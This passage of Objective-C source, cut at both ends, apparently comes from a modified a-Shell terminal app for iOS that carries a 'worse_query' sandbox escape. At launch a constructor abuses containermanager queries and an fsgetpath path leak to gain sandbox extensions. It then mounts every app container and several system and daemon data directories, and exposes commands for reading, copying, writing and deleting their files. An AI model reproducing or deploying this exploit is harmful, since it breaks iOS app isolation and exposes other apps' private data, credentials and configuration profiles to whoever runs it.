        NSString *path = [[NSFileManager defaultManager] stringWithFileSystemRepresentation:buffer length:strlen(buffer)];
        if (path.length > 0) [result addObject:path];
    }
    [result sortUsingSelector:@selector(localizedStandardCompare:)];
    return result;
}

// ---------------------------------------------------------------------------
// Handle cache
// ---------------------------------------------------------------------------

static void sbx_store_handle(NSString *path, int64_t handle, NSString *engine) {
    if (handle <= 0) return;
    pthread_mutex_lock(&g_lock);
    if (g_handles == nil) g_handles = [NSMutableArray array];
    [g_handles addObject:@{@"path": path, @"handle": @(handle), @"engine": engine ?: @"worse_query"}];
    pthread_mutex_unlock(&g_lock);
}

static int64_t sbx_cached_handle_locked(NSString *path) {
    if (g_handles == nil) return 0;
    NSString *prefix = [path stringByAppendingString:@"/"];
    for (NSDictionary *entry in g_handles) {
        NSString *p = entry[@"path"];
        if ([path isEqualToString:p] || [path hasPrefix:prefix] || [path hasPrefix:[p stringByAppendingString:@"/"]]) {
            return [entry[@"handle"] longLongValue];
        }
    }
    return 0;
}

static BOOL sbx_has_handle_for(NSString *path) {
    pthread_mutex_lock(&g_lock);
    int64_t h = sbx_cached_handle_locked(path);
    pthread_mutex_unlock(&g_lock);
    return h > 0;
}

static BOOL sbx_uses_alt_flags(NSString *path) {
    NSInteger major = [[NSProcessInfo processInfo] operatingSystemVersion].majorVersion;
    return major == 26 && [path containsString:@"/var/mobile/Containers/Shared/AppGroup"];
}

// ---------------------------------------------------------------------------
// Grant
// ---------------------------------------------------------------------------

static int64_t sbx_grant_path(NSString *raw, BOOL create, NSString **engineOut) {
    NSString *path = sbx_canonical(raw);
    if (path.length == 0 || ![path hasPrefix:@"/"]) return -255;
    if (sbx_is_own_path(path)) {
        if (engineOut) *engineOut = @"own-sandbox";
        return 0;
    }

    pthread_mutex_lock(&g_lock);
    int64_t cached = sbx_cached_handle_locked(path);
    pthread_mutex_unlock(&g_lock);
    if (cached > 0) {
        if (engineOut) *engineOut = @"cached";
        return cached;
    }

    NSString *group = sbx_group();
    bool alt = sbx_uses_alt_flags(path);
    int64_t handle = 0;
    NSString *engine = nil;

    pthread_mutex_lock(&g_query_lock);
    if (group.length > 0) {
        handle = sbx_worse_query(path, alt, create);
        if (handle > 0) engine = @"worse_query";
    }
    if (handle <= 0) {
        int64_t fallback = sbx_fallback_query(path, alt);
        if (fallback > 0) {
            handle = fallback;
            engine = @"fallback";
        }
    }
    pthread_mutex_unlock(&g_query_lock);

    if (handle > 0) {
        sbx_store_handle(path, handle, engine);
        if (engineOut) *engineOut = engine;
    } else if (engineOut) {
        *engineOut = nil;
    }
    return handle;
}

static int64_t sbx_grant_mount(NSString *path) {
    int64_t handle = sbx_grant_path(path, NO, NULL);
    if (handle <= 0) handle = sbx_grant_path(path, YES, NULL);
    return handle;
}

static NSString *sbx_symlink_target(NSString *path) {
    char buf[PATH_MAX];
    ssize_t n = readlink(path.fileSystemRepresentation, buf, sizeof(buf) - 1);
    if (n <= 0) return nil;
    buf[n] = '\0';
    NSString *target = [NSString stringWithUTF8String:buf];
    if (target.length == 0) return nil;
    if (![target hasPrefix:@"/"]) {
        target = [[path stringByDeletingLastPathComponent] stringByAppendingPathComponent:target];
    }
    return sbx_canonical(target);
}

static int64_t sbx_grant_item(NSString *raw) {
    NSString *path = sbx_canonical(raw);
    if (sbx_is_own_path(path)) return 0;

    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) == 0) {
        if (S_ISLNK(st.st_mode)) {
            NSString *target = sbx_symlink_target(path);
            if (target.length > 0) {
                int64_t h = sbx_grant_path(target, NO, NULL);
                if (h > 0) return h;
            }
        }
        if (S_ISDIR(st.st_mode)) return sbx_grant_path(path, NO, NULL);
        NSString *parent = [path stringByDeletingLastPathComponent];
        int64_t h = sbx_grant_path(parent, NO, NULL);
        return h != 0 ? h : sbx_grant_path(path, NO, NULL);
    }

    int64_t h = sbx_grant_path(path, NO, NULL);
    if (h > 0) return h;
    return sbx_grant_path([path stringByDeletingLastPathComponent], NO, NULL);
}

static void sbx_release_all_internal(void) {
    pthread_mutex_lock(&g_lock);
    NSArray *handles = [g_handles copy];
    [g_handles removeAllObjects];
    pthread_mutex_unlock(&g_lock);
    for (NSDictionary *entry in handles) {
        sbx_release_handle([entry[@"handle"] longLongValue]);
    }
    sbx_printf("released %lu sandbox extension(s)\n", (unsigned long)handles.count);
}

// ---------------------------------------------------------------------------
// Mount points
// ---------------------------------------------------------------------------

static NSArray<NSDictionary *> *sbx_mount_points(void) {
    return @[
        @{@"name": @"system", @"root": @"/private/var/containers/Data/System", @"children": @NO, @"class": @0},
        @{@"name": @"systemgroups", @"root": @"/private/var/containers/Shared/SystemGroup", @"children": @YES, @"class": @11},
        @{@"name": @"apps", @"root": @"/private/var/mobile/Containers/Data/Application", @"children": @YES, @"class": @2},
        @{@"name": @"daemons", @"root": @"/private/var/mobile/Containers/Data/InternalDaemon", @"children": @YES, @"class": @10},
        @{@"name": @"plugins", @"root": @"/private/var/mobile/Containers/Data/PluginKitPlugin", @"children": @YES, @"class": @8},
        @{@"name": @"appgroups", @"root": @"/private/var/mobile/Containers/Shared/AppGroup", @"children": @YES, @"class": @5},
        @{@"name": @"appgroups27", @"root": @"/private/var/containers/Shared/AppGroup", @"children": @YES, @"class": @5}
    ];
}

static NSArray<NSString *> *sbx_list_dir(NSString *path) {
    const char *p = path.fileSystemRepresentation;
    DIR *dir = opendir(p);
    if (!dir) return nil;
    NSMutableArray *entries = [NSMutableArray array];
    struct dirent *ent = NULL;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;
        NSString *name = [NSString stringWithUTF8String:ent->d_name];
        if (name.length > 0) [entries addObject:name];
    }
    closedir(dir);
    [entries sortUsingSelector:@selector(localizedStandardCompare:)];
    return entries;
}

static NSString *sbx_bundle_id(NSString *containerPath) {
    char buf[512];
    memset(buf, 0, sizeof(buf));
    ssize_t len = getxattr(containerPath.fileSystemRepresentation,
                           "com.apple.containermanager.identifier", buf, sizeof(buf) - 1, 0, 0);
    if (len > 0) {
        return [NSString stringWithUTF8String:buf];
    }

    NSString *meta = [containerPath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
    NSData *data = [NSData dataWithContentsOfFile:meta];
    if (data.length == 0) return nil;
    id plist = [NSPropertyListSerialization propertyListWithData:data
                                                         options:NSPropertyListImmutable
                                                          format:NULL
                                                           error:NULL];
    if (![plist isKindOfClass:[NSDictionary class]]) return nil;
    id ident = ((NSDictionary *)plist)[@"MCMMetadataIdentifier"];
    if ([ident isKindOfClass:[NSString class]] && [(NSString *)ident length] > 0) return ident;
    return nil;
}

static NSString *sbx_safe_name(NSString *name) {
    NSMutableString *out = [NSMutableString stringWithString:name ?: @"unknown"];
    [out replaceOccurrencesOfString:@"/" withString:@"_" options:0 range:NSMakeRange(0, out.length)];
    [out replaceOccurrencesOfString:@":" withString:@"_" options:0 range:NSMakeRange(0, out.length)];
    return out;
}

static BOOL sbx_symlink(NSString *target, NSString *link) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:link error:NULL];
    return [fm createSymbolicLinkAtPath:link withDestinationPath:target error:NULL];
}

static void sbx_write_manifest(int64_t mounted, int64_t failed) {
    NSMutableString *text = [NSMutableString string];
    [text appendString:@"Terminal sandbox escape manifest\n"];
    [text appendFormat:@"OS: %@\n", [[NSProcessInfo processInfo] operatingSystemVersionString]];
    pthread_mutex_lock(&g_lock);
    NSString *group = g_group;
    NSArray *handles = [g_handles copy];
    pthread_mutex_unlock(&g_lock);
    [text appendFormat:@"App group: %@\n", group ?: @"(none)"];
    [text appendFormat:@"Mounted: %lld, failed: %lld\n", mounted, failed];
    [text appendFormat:@"Active handles: %lu\n\n", (unsigned long)handles.count];
    for (NSDictionary *entry in handles) {
        [text appendFormat:@"  handle %@: %@ (%@)\n",
             entry[@"handle"], entry[@"path"], entry[@"engine"]];
    }
    NSString *manifest = [sbx_mount_root() stringByAppendingPathComponent:@".mount_info"];
    [text writeToFile:manifest atomically:YES encoding:NSUTF8StringEncoding error:NULL];
}

static void sbx_automount(BOOL showUI) {
    @autoreleasepool {
        pthread_mutex_lock(&g_mount_lock);

        pthread_mutex_lock(&g_lock);
        if (g_mount_running) {
            pthread_mutex_unlock(&g_lock);
            pthread_mutex_unlock(&g_mount_lock);
            return;
        }
        g_mount_running = YES;
        g_mount_done = NO;
        pthread_mutex_unlock(&g_lock);

        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *mountRoot = sbx_mount_root();
        [fm createDirectoryAtPath:mountRoot withIntermediateDirectories:YES attributes:nil error:NULL];

        // Clear previous mounts, keeping the manifest until it is replaced.
        NSArray<NSString *> *old = [fm contentsOfDirectoryAtPath:mountRoot error:NULL];
        for (NSString *item in old) {
            if ([item isEqualToString:@".mount_info"]) continue;
            [fm removeItemAtPath:[mountRoot stringByAppendingPathComponent:item] error:NULL];
        }

        if (sbx_group() == nil) {
            NSLog(@"[TerminalSBX] warning: no app group available; using class-13 fallback only");
        }

        int64_t mounted = 0;
        int64_t failed = 0;

        sbx_progress_set(0.06, @"正在准备挂载点…");
        NSArray<NSDictionary *> *mountPoints = sbx_mount_points();
        NSUInteger mountPointCount = mountPoints.count;
        NSUInteger mountPointIndex = 0;
        for (NSDictionary *mp in mountPoints) {
            NSString *name = mp[@"name"];
            double baseProgress = 0.06 + 0.84 * ((double)mountPointIndex / (double)MAX(mountPointCount, (NSUInteger)1));
            double spanProgress = 0.84 / (double)MAX(mountPointCount, (NSUInteger)1);
            mountPointIndex++;
            sbx_progress_set(baseProgress, [NSString stringWithFormat:@"正在处理 %@…", name]);
            NSString *root = mp[@"root"];
            BOOL children = [mp[@"children"] boolValue];
            BOOL exists = sbx_path_exists(root);

            int64_t handle = sbx_grant_mount(root);
            NSString *dest = [mountRoot stringByAppendingPathComponent:name];
            if (!children) {
                if (handle <= 0) {
                    failed++;
                    NSLog(@"[TerminalSBX] cannot grant %@ (handle=%lld, exists=%d)", root, handle, exists);
                    continue;
                }
                if (sbx_symlink(root, dest)) {
                    mounted++;
                    sbx_mark_root(root);
                    NSLog(@"[TerminalSBX] mounted %@ -> %@", name, root);
                } else {
                    failed++;
                }
                sbx_progress_set(baseProgress + spanProgress, [NSString stringWithFormat:@"完成 %@", name]);
                continue;
            }

            NSMutableArray<NSDictionary *> *childItems = [NSMutableArray array];
            NSArray<NSString *> *entries = handle > 0 ? sbx_list_dir(root) : nil;
            if (entries != nil) {
                for (NSString *entry in entries) {
                    NSString *child = [root stringByAppendingPathComponent:entry];
                    [childItems addObject:@{@"path": child, @"id": @""}];
                }
            } else {
                // iOS 27 refuses a token for the parent of Application,
                // InternalDaemon, PluginKitPlugin and SystemGroup.  Enumerate
                // the individual containers with fsgetpath instead.
                double seconds = [name isEqualToString:@"apps"] ? 12.0 : 6.0;
                NSArray<NSString *> *leaked = sbx_pathleak(root, 2000000, seconds);
                for (NSString *child in leaked ?: @[]) {
                    [childItems addObject:@{@"path": child, @"id": @""}];
                }
                if (leaked.count > 0) {
                    NSLog(@"[TerminalSBX] fsgetpath found %lu container(s) under %@",
                          (unsigned long)leaked.count, root);
                }
            }
            if (childItems.count == 0) {
                failed++;
                NSLog(@"[TerminalSBX] cannot enumerate %@", root);
                sbx_progress_set(baseProgress + spanProgress, [NSString stringWithFormat:@"跳过 %@", name]);
                continue;
            }
            sbx_mark_root(root);
            sbx_progress_set(baseProgress + spanProgress * 0.25,
                             [NSString stringWithFormat:@"发现 %lu 个 %@ 容器", (unsigned long)childItems.count, name]);

            [fm createDirectoryAtPath:dest withIntermediateDirectories:YES attributes:nil error:NULL];
            int64_t childMounted = 0;
            NSUInteger childIndex = 0;
            NSUInteger childCount = childItems.count;
            for (NSDictionary *childInfo in childItems) {
                if ((childIndex & 0x1F) == 0) {
                    double p = baseProgress + spanProgress * (0.25 + 0.70 * ((double)childIndex / (double)MAX(childCount, (NSUInteger)1)));
                    sbx_progress_set(p, [NSString stringWithFormat:@"%@ %lu/%lu", name,
                                         (unsigned long)childIndex, (unsigned long)childCount]);
                }
                childIndex++;
                NSString *child = childInfo[@"path"];
                int64_t childHandle = sbx_grant_mount(child);
                if (childHandle <= 0) {
                    failed++;
                    continue;
                }
                if (!sbx_path_is_dir(child)) continue;

                NSString *fallbackName = child.lastPathComponent;
                NSString *bundleId = childInfo[@"id"];
                if (bundleId.length == 0) bundleId = sbx_bundle_id(child);
                if (bundleId.length == 0) bundleId = fallbackName;
                bundleId = sbx_safe_name(bundleId);

                NSString *childDest = [dest stringByAppendingPathComponent:bundleId];
                if ([fm fileExistsAtPath:childDest]) {
                    childDest = [dest stringByAppendingPathComponent:
                                 [NSString stringWithFormat:@"%@_%@", bundleId, [fallbackName substringToIndex:MIN((NSUInteger)8, fallbackName.length)]]];
                }
                [fm createDirectoryAtPath:childDest withIntermediateDirectories:YES attributes:nil error:NULL];

                NSArray<NSString *> *subdirs = @[@"Documents", @"Library", @"tmp", @"SystemData", @"StoreKit"];
                for (NSString *sub in subdirs) {
                    NSString *target = [child stringByAppendingPathComponent:sub];
                    if (!sbx_path_exists(target)) continue;
                    sbx_grant_mount(target);
                    sbx_symlink(target, [childDest stringByAppendingPathComponent:sub]);
                }
                sbx_symlink(child, [childDest stringByAppendingPathComponent:@"_data"]);
                childMounted++;
            }
            mounted += childMounted;
            NSLog(@"[TerminalSBX] mounted %lld container(s) under %@", childMounted, name);
            sbx_progress_set(baseProgress + spanProgress,
                             [NSString stringWithFormat:@"完成 %@ (%lld)", name, childMounted]);
        }

        sbx_progress_set(0.90, @"正在挂载便捷目录…");
        // Mount Terminal's own container by bundle ID as well.  fsgetpath()
        // does not always report the calling process's own container during
        // the scan, but no extension is needed for it.
        NSString *ownRoot = NSHomeDirectory();
        NSString *ownBid = [[NSBundle mainBundle] bundleIdentifier];
        if (ownBid.length == 0) ownBid = @"com.apple.Terminal";
        NSString *appsDest = [mountRoot stringByAppendingPathComponent:@"apps"];
        [fm createDirectoryAtPath:appsDest withIntermediateDirectories:YES attributes:nil error:NULL];
        NSString *ownDest = [appsDest stringByAppendingPathComponent:sbx_safe_name(ownBid)];
        if (![fm fileExistsAtPath:ownDest]) {
            [fm createDirectoryAtPath:ownDest withIntermediateDirectories:YES attributes:nil error:NULL];
            NSArray<NSString *> *subdirs = @[@"Documents", @"Library", @"tmp", @"SystemData", @"StoreKit"];
            for (NSString *sub in subdirs) {
                NSString *target = [ownRoot stringByAppendingPathComponent:sub];
                if (sbx_path_exists(target)) {
                    sbx_symlink(target, [ownDest stringByAppendingPathComponent:sub]);
                }
            }
            sbx_symlink(ownRoot, [ownDest stringByAppendingPathComponent:@"_data"]);
            mounted++;
        }

        // Convenience mounts inside the system group tree.
        NSString *gestalt = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        if (sbx_path_exists(gestalt) && sbx_grant_mount(gestalt) > 0) {
            if (sbx_symlink(gestalt, [mountRoot stringByAppendingPathComponent:@"gestalt"])) mounted++;
        }
        NSString *profiles = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles";
        if (sbx_path_exists(profiles) && sbx_grant_mount(profiles) > 0) {
            if (sbx_symlink(profiles, [mountRoot stringByAppendingPathComponent:@"configprofiles"])) mounted++;
        }

        sbx_progress_set(0.97, @"正在写入挂载清单…");
        sbx_write_manifest(mounted, failed);

        pthread_mutex_lock(&g_lock);
        g_mount_mounted = mounted;
        g_mount_failed = failed;
        g_mount_done = YES;
        g_mount_running = NO;
        pthread_mutex_unlock(&g_lock);

        NSLog(@"[TerminalSBX] auto-mount complete: %lld mounted, %lld failed", mounted, failed);
        sbx_progress_set(1.0, @"完成");
        if (showUI) sbx_progress_finish();
        pthread_mutex_unlock(&g_mount_lock);
    }
}

static void *sbx_automount_thread(void *arg) {
    (void)arg;
    sbx_show_progress();
    usleep(400000);
    sbx_automount(YES);
    return NULL;
}

__attribute__((constructor))
static void sbx_initialize(void) {
    // Every launch starts with a fresh terminal and no restored command
    // history.  a-Shell checks keep_content before restoring terminal data,
    // cwd and the history array.
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setBool:NO forKey:@"keep_content"];
    [defaults synchronize];

    // Do not touch Foundation before the app's run loop exists; mount on a
    // detached thread shortly after launch.
    pthread_t thread;
    if (pthread_create(&thread, NULL, sbx_automount_thread, NULL) == 0) {
        pthread_detach(thread);
    }
}

// ---------------------------------------------------------------------------
// Error descriptions
// ---------------------------------------------------------------------------

static const char *sbx_error_text(int64_t code) {
    switch (code) {
        case -255: return "target does not exist (use -c to bypass the existence check)";
        case -254: return "not an absolute path";
        case -1:   return "no usable App Group / container functions unavailable";
        case -2:   return "failed to resolve containermanager functions";
        case -3:   return "failed to create container query";
        case -4:   return "failed to create the Library/Caches symlink";
        case -5:   return "query rejected by containermanagerd";
        case -6:   return "kernel refused to issue a sandbox extension";
        default:   return "unknown error";
    }
}

// ---------------------------------------------------------------------------
// Commands
// ---------------------------------------------------------------------------

__attribute__((visibility("default")))
int sbx_badshell(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        sbx_printf(
"Terminal — a-Shell 2.3.2 full + worse_query sandbox escape\n"
"\n"
"The launch-time mount runs in the background and takes ~40 seconds.\n"
"Use \"sbx_status\" to check progress.\n"
"\n"
"Auto-mounted at ~/Documents/_sandbox/ by the launch-time escape:\n"
"  _sandbox/system/        /var/containers/Data/System\n"
"  _sandbox/systemgroups/  /var/containers/Shared/SystemGroup/*\n"
"  _sandbox/apps/          /var/mobile/Containers/Data/Application/*\n"
"  _sandbox/daemons/       /var/mobile/Containers/Data/InternalDaemon/*\n"
"  _sandbox/plugins/       /var/mobile/Containers/Data/PluginKitPlugin/*\n"
"  _sandbox/appgroups/     /var/mobile/Containers/Shared/AppGroup/*\n"
"  _sandbox/appgroups27/   /var/containers/Shared/AppGroup/* (iOS 27)\n"
"  _sandbox/gestalt/       MobileGestalt cache\n"
"  _sandbox/configprofiles/ ConfigurationProfiles\n"
"\n"
"Every app container is exposed by bundle ID:\n"
"  _sandbox/apps/com.example.app/Documents/\n"
"  _sandbox/apps/com.example.app/_data/     full container root\n"
"\n"
"Use standard commands (ls, cat, cp, grep, find, tar, python3...) on these\n"
"paths, or use the sbx_* commands for manual control:\n"
"\n"
"  sbxhelp                  Show this help and mount overview\n"
"  neofetch                 System information (actual device)\n"
"  sbx_grant [-c] <path>    Consume a sandbox extension for a path\n"
"  sbx_release <handle|path|all>  Release sandbox extension(s)\n"
"  sbx_status [-v]          Show app group, mount state and active handles\n"
"  sbx_remount              Re-run the complete auto-mount\n"
"  sbx_ls <path>            List a directory (or file metadata)\n"
"  sbx_cat <file>           Print a file\n"
"  sbx_cp <src> <dst>       Copy a file or directory\n"
"  sbx_write [-a] <file> <text...>  Write/append text\n"
"  sbx_rm [-r] <path>       Remove a file (or directory with -r)\n"
"  sbx_hexdump [-n N] <file>  Hex dump\n"
"  sbx_containers [root]    List containers and bundle IDs\n"
"  sbx_id <container>       Read a container's bundle ID\n"
"  sbx_sysgroups [filter]   List system group containers\n"
"  sbx_probe                Probe every supported escape path\n"
"  sbx_paths                Show the supported path table\n"
"  bswelcome                Banner + wait for the mount to finish\n"
"\n"
"Native plugin environment (installed in ~/Documents/.terminal):\n"
"  termenv init            Create the prefix and local repository\n"
"  termenv selftest        Test apt/dpkg with the hello package\n"
"  apt update              Refresh the package index\n"
"  apt install <package>   Install a Terminal-compatible .deb\n"
"  dpkg -i <file.deb>      Install a .deb directly\n"
"  dpkg -l                 List installed packages\n"
"  mkdeb <name> <version> <payload-dir> [arch]\n"
"  bash <script>           a-Shell sh compatibility launcher\n"
"\n"
"Quick start:\n"
"  cd ~/Documents/_sandbox/apps\n"
"  ls\n"
"  cat com.example.app/Documents/file.txt\n"
"\n");
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_status(int argc, char **argv) {
    @autoreleasepool {
        BOOL verbose = NO;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) verbose = YES;
        }

        pthread_mutex_lock(&g_lock);
        BOOL done = g_mount_done;
        BOOL running = g_mount_running;
        int64_t mounted = g_mount_mounted;
        int64_t failed = g_mount_failed;
        NSString *group = g_group;
        NSArray *handles = [g_handles copy];
        pthread_mutex_unlock(&g_lock);

        NSProcessInfo *pi = [NSProcessInfo processInfo];
        NSOperatingSystemVersion v = pi.operatingSystemVersion;
        sbx_printf("Terminal sandbox escape status\n");
        sbx_printf("  OS:          iOS %ld.%ld.%ld\n", (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion);
        sbx_printf("  App group:   %s\n", group ? group.UTF8String : "(none)");
        sbx_printf("  Mount root:  %s\n", sbx_display(sbx_mount_root()).UTF8String);
        sbx_printf("  Auto-mount:  %s\n", done ? "complete" : (running ? "running (paths appear gradually, ~40s)" : "pending"));
        if (done) sbx_printf("  Mounted:     %lld (failed %lld)\n", mounted, failed);
        sbx_printf("  Handles:     %lu\n", (unsigned long)handles.count);

        sbx_printf("\nSupported paths:\n");
        for (NSDictionary *mp in sbx_mount_points()) {
            NSString *path = mp[@"root"];
            BOOL has = sbx_has_handle_for(path) || sbx_root_accessible(path);
            sbx_printf("  [%s] %-58s %s\n",
                       has ? "OK" : "--",
                       sbx_display(path).UTF8String,
                       sbx_path_exists(path) ? "" : "(not present)");
        }

        if (handles.count > 0) {
            sbx_printf("\nActive sandbox extensions:\n");
            NSUInteger limit = verbose ? handles.count : MIN(handles.count, (NSUInteger)24);
            for (NSUInteger i = 0; i < limit; i++) {
                NSDictionary *e = handles[i];
                sbx_printf("  %8s  %-10s %s\n",
                           [e[@"handle"] stringValue].UTF8String,
                           [e[@"engine"] UTF8String],
                           sbx_display(e[@"path"]).UTF8String);
            }
            if (limit < handles.count) {
                sbx_printf("  ... %lu more (use sbx_status -v)\n",
                           (unsigned long)(handles.count - limit));
            }
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_grant(int argc, char **argv) {
    @autoreleasepool {
        BOOL create = NO;
        NSString *path = nil;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-c") == 0) create = YES;
            else path = [NSString stringWithUTF8String:argv[i]];
        }
        if (path.length == 0) {
            sbx_eprintf("usage: sbx_grant [-c] <path>\n"
                        "  Consume a sandbox extension for <path> via worse_query.\n"
                        "  -c  bypass the target-existence check\n");
            sbx_eprintf("\nSupported escape roots:\n");
            for (NSDictionary *mp in sbx_mount_points()) {
                sbx_eprintf("  %s\n", sbx_display(mp[@"root"]).UTF8String);
            }
            return 1;
        }

        NSString *engine = nil;
        NSString *canonical = sbx_canonical(path);
        int64_t handle = sbx_grant_path(canonical, create, &engine);
        if (handle > 0) {
            sbx_printf("granted %s (handle %lld, %s)\n",
                       sbx_display(canonical).UTF8String, handle, engine.UTF8String);
            return 0;
        }
        if (handle == 0 && [engine isEqualToString:@"own-sandbox"]) {
            sbx_printf("%s is already inside Terminal's own sandbox (no extension needed)\n",
                       sbx_display(canonical).UTF8String);
            return 0;
        }
        sbx_eprintf("sbx_grant: %s: %s (%lld)\n",
                    sbx_display(canonical).UTF8String, sbx_error_text(handle), handle);
        return 1;
    }
}

__attribute__((visibility("default")))
int sbx_release(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            sbx_eprintf("usage: sbx_release <handle|path|all>\n");
            pthread_mutex_lock(&g_lock);
            NSArray *handles = [g_handles copy];
            pthread_mutex_unlock(&g_lock);
            if (handles.count == 0) {
                sbx_eprintf("no active sandbox extensions\n");
                return 1;
            }
            sbx_eprintf("\nActive extensions:\n");
            NSUInteger limit = MIN(handles.count, (NSUInteger)200);
            for (NSUInteger i = 0; i < limit; i++) {
                NSDictionary *e = handles[i];
                sbx_eprintf("  %s  %s\n",
                            [e[@"handle"] stringValue].UTF8String,
                            sbx_display(e[@"path"]).UTF8String);
            }
            if (limit < handles.count) sbx_eprintf("  ... %lu more\n", (unsigned long)(handles.count - limit));
            return 1;
        }

        NSString *target = [NSString stringWithUTF8String:argv[1]];
        if ([target isEqualToString:@"all"]) {
            sbx_release_all_internal();
            return 0;
        }

        pthread_mutex_lock(&g_lock);
        NSDictionary *found = nil;
        NSUInteger index = NSNotFound;
        NSString *canonical = sbx_canonical(target);
        for (NSUInteger i = 0; i < g_handles.count; i++) {
            NSDictionary *e = g_handles[i];
            if ([e[@"handle"] stringValue].longLongValue == target.longLongValue && target.longLongValue > 0) {
                found = e; index = i; break;
            }
            if ([e[@"path"] isEqualToString:canonical]) {
                found = e; index = i; break;
            }
        }
        if (found) [g_handles removeObjectAtIndex:index];
        pthread_mutex_unlock(&g_lock);

        if (!found) {
            sbx_eprintf("sbx_release: '%s' not found in active extensions\n", target.UTF8String);
            return 1;
        }
        int64_t handle = [found[@"handle"] longLongValue];
        sbx_release_handle(handle);
        sbx_printf("released handle %lld (%s)\n", handle, sbx_display(found[@"path"]).UTF8String);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_remount(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        sbx_printf("releasing existing handles...\n");
        sbx_release_all_internal();
        sbx_printf("re-mounting all supported sandbox paths...\n");
        sbx_automount(NO);
        pthread_mutex_lock(&g_lock);
        int64_t mounted = g_mount_mounted;
        int64_t failed = g_mount_failed;
        NSUInteger handles = g_handles.count;
        pthread_mutex_unlock(&g_lock);
        sbx_printf("done: %lld mounted, %lld failed, %lu handle(s) active\n",
                   mounted, failed, (unsigned long)handles);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_ls(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            sbx_eprintf("usage: sbx_ls <path>\n");
            return 1;
        }
        NSString *path = sbx_canonical([NSString stringWithUTF8String:argv[1]]);
        int64_t handle = sbx_grant_item(path);
        if (handle <= 0 && !sbx_is_own_path(path)) {
            sbx_eprintf("sbx_ls: cannot access %s (%s)\n", sbx_display(path).UTF8String, sbx_error_text(handle));
            return 1;
        }

        struct stat st;
        if (stat(path.fileSystemRepresentation, &st) != 0) {
            sbx_eprintf("sbx_ls: %s: %s\n", sbx_display(path).UTF8String, strerror(errno));
            return 1;
        }
        if (!S_ISDIR(st.st_mode)) {
            sbx_printf("%s\t%lld bytes\n", sbx_display(path).UTF8String, (long long)st.st_size);
            return 0;
        }

        NSArray<NSString *> *entries = sbx_list_dir(path);
        if (entries == nil) {
            sbx_eprintf("sbx_ls: %s: %s\n", sbx_display(path).UTF8String, strerror(errno));
            return 1;
        }
        for (NSString *name in entries) {
            NSString *full = [path stringByAppendingPathComponent:name];
            struct stat child;
            if (lstat(full.fileSystemRepresentation, &child) != 0) {
                sbx_printf("%s\n", name.UTF8String);
                continue;
            }
            if (S_ISDIR(child.st_mode)) {
                sbx_printf("%s/\n", name.UTF8String);
            } else {
                sbx_printf("%s\t%lld bytes\n", name.UTF8String, (long long)child.st_size);
            }
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_cat(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            sbx_eprintf("usage: sbx_cat <file>\n");
            return 1;
        }
        NSString *path = sbx_canonical([NSString stringWithUTF8String:argv[1]]);
        int64_t handle = sbx_grant_item(path);
        if (handle <= 0 && !sbx_is_own_path(path)) {
            sbx_eprintf("sbx_cat: cannot access %s (%s)\n", sbx_display(path).UTF8String, sbx_error_text(handle));
            return 1;
        }
        FILE *f = fopen(path.fileSystemRepresentation, "rb");
        if (!f) {
            sbx_eprintf("sbx_cat: %s: %s\n", sbx_display(path).UTF8String, strerror(errno));
            return 1;
        }
        unsigned char buf[65536];
        size_t n;
        FILE *out = sbx_out();
        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
            if (fwrite(buf, 1, n, out) != n) break;
        }
        int err = ferror(f);
        fclose(f);
        fflush(out);
        if (err) {
            sbx_eprintf("sbx_cat: read error\n");
            return 1;
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_cp(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 3) {
            sbx_eprintf("usage: sbx_cp <source> <destination>\n");
            return 1;
        }
        NSString *src = sbx_canonical([NSString stringWithUTF8String:argv[1]]);
        NSString *dst = sbx_canonical([NSString stringWithUTF8String:argv[2]]);
        int64_t hs = sbx_grant_item(src);
        if (hs <= 0 && !sbx_is_own_path(src)) {
            sbx_eprintf("sbx_cp: cannot access source (%s)\n", sbx_error_text(hs));
            return 1;
        }
        int64_t hd = sbx_grant_item([dst stringByDeletingLastPathComponent]);
        if (hd <= 0 && !sbx_is_own_path(dst)) {
            sbx_eprintf("sbx_cp: cannot access destination (%s)\n", sbx_error_text(hd));
            return 1;
        }

        NSFileManager *fm = [NSFileManager defaultManager];
        BOOL dstIsDir = NO;
        if ([fm fileExistsAtPath:dst isDirectory:&dstIsDir] && dstIsDir) {
            dst = [dst stringByAppendingPathComponent:src.lastPathComponent];
        }
        if ([fm fileExistsAtPath:dst]) {
            [fm removeItemAtPath:dst error:NULL];
        }
        NSError *error = nil;
        if (![fm copyItemAtPath:src toPath:dst error:&error]) {
            sbx_eprintf("sbx_cp: %s\n", error.localizedDescription.UTF8String);
            return 1;
        }
        sbx_printf("copied %s -> %s\n", sbx_display(src).UTF8String, sbx_display(dst).UTF8String);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_write(int argc, char **argv) {
    @autoreleasepool {
        BOOL append = NO;
        int first = 1;
        if (argc > 1 && strcmp(argv[1], "-a") == 0) { append = YES; first = 2; }
        if (argc <= first + 1) {
